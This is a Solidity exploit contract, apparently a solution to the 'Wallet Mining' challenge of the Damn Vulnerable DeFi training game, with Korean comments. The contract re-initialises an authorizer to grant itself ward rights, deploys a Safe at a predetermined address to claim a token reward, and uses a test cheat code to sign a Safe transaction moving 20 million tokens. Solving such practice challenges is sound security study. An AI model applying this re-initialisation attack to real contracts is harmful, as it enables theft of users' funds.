pragma solidity =0.8.25;

import {Vm} from "forge-std/Vm.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Attack {
    address player;
    address user;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    DamnValuableToken token;
    address ward;
    uint256 userPrivateKey;

    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    constructor(address _player, address _user, address _authorizer, address _walletDeployer, address _token, address _ward, uint256 _userPrivateKey) {
        player = _player;
        user = _user;
        authorizer = AuthorizerUpgradeable(_authorizer);
        walletDeployer = WalletDeployer(_walletDeployer);
        token = DamnValuableToken(_token);
        ward = _ward;
        userPrivateKey = _userPrivateKey;


        exploit();
    }

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    function exploit() public {
        Safe safeWallet = Safe(payable(USER_DEPOSIT_ADDRESS));
        // 1. WalletDeployer에서 1DVT 획득하여 ward에게 전송
        // AuthorizerUpgradeable의 wards[address(this)][USER_DEPOSIT_ADDRESS]를 1로 등록
        address[] memory wards = new address[](1);
        wards[0] = address(this);

        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        authorizer.init(wards, aims);

        // deploy safe wallet initializer
        uint256 saltNonce = 13;
        address[] memory owners = new address[](1);
        owners[0] = user;

        bytes memory initializer = abi.encodeCall(
            Safe.setup,
            (
                owners,              // [user]
                1,                   // threshold 1-of-1
                address(0),          // to
                "",                  // data
                address(0),          // fallbackHandler
                address(0),          // paymentToken
                0,                   // payment
                payable(address(0))  // paymentReceiver
            )
        );

        // WalletDeplyer에서 drop 호출하여 1DVT 획득과 동시에 safe wallet 배포
        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, saltNonce);

        // 1DVT ward에게 전송
        token.transfer(ward, 1 ether);

        // 2. 2000만 DVT 회수하기
        // call execTransaction to get back 2000만 DVT to user

        // Safe 지갑이 실행할 내용 : 2000만 DVT를 user에게 전송하는 calldata
        bytes memory transferDVTtoUser = abi.encodeCall(
            token.transfer,
            (user, DEPOSIT_TOKEN_AMOUNT)
        );

        // user(=Safe owner)가 서명할 tx hash
        uint256 nonce = safeWallet.nonce();
        bytes32 txHash = safeWallet.getTransactionHash(
            address(token),        // DVT 주소
            0,                  // no ether
            transferDVTtoUser,   // DVT.transfer(user, DEPOSIT_TOKEN_AMOUNT)
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            nonce
        );

        // user(=Safe owner)가 tx hash에 서명
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
        bytes memory signature = abi.encodePacked(r, s, v);


        // player가 user의 서명을 사용하여 execTransaction 호출
        safeWallet.execTransaction(
            address(token),
            0,
            transferDVTtoUser,
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            signature
        );
    }
}